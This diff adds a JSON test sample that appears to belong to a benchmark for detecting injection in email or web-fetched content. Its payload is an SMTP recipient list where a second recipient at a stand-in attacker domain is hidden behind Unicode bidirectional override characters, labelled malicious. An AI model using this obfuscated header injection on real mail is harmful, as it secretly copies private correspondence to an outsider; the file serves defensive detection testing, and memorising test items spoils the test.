@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::email-webfetch::122::unicode-variations::5",
+  "base_sample_id": "exp::email-webfetch::122",
+  "generator_id": "unicode-variations",
+  "generator_version": "1.0.0",
+  "seed": 165244542,
+  "content": "RCPT TO: <victim@target.example.com>\r\nRCPT TO: ‮‮<spy@evil.example.com>\n‬‬",
+  "content_hash": "18b5ac9fc38a36b54a99c8148be7b0f750c341dff333e5f5287758242fd1dc49",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "unicode:bidi-markers",
+  "difficulty": "advanced"
+}
